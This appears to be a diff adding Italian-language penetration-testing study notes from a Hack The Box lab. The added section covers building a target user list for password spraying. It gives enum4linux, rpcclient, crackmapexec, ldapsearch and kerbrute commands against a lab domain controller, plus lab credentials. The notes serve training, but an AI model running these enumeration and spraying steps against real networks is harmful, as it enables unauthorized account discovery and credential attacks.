@@ -259,3 +259,30 @@ GPODisplayName : Default Domain Policy
 **BISOGNA FARE ATTENZIONE A NON BLOCCARE GLI ACCOUNT. MOLTO SPESSO HANNO UN LIMITE DI BLOCCO BASSO**
 
 
+# Password Spraying -  Making a target User List
+
+Per fare uno spray attack dovremo prima enumerare utenti e avere una lista
+
+### Enumerare tutti gli utenti usando enum4linux (piu' pulito) (SMB NULL)
+`j4k1dibe@htb[/htb]$ enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"`
+
+### Usando rpcclient (SMB NULL)
+`j4k1dibe@htb[/htb]$ rpcclient -U "" -N 172.16.5.5`
+
+### USando CrackMapExec (SMB NULL)
+`j4k1dibe@htb[/htb]$ crackmapexec smb 172.16.5.5 --users`
+
+### Usando ldapsearch (LDAP Anonymous BIND)
+`j4k1dibe@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "`
+
+### Usando windapsearch (LDAP Anon)
+
+
+### Usando kerbrute (si brute forza e si trovano nomi utente)
+`j4k1dibe@htb[/htb]$  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt `
+
+
+## Enumerazione autenticata
+
+### Con CrackMapExec
+`j4k1dibe@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users`
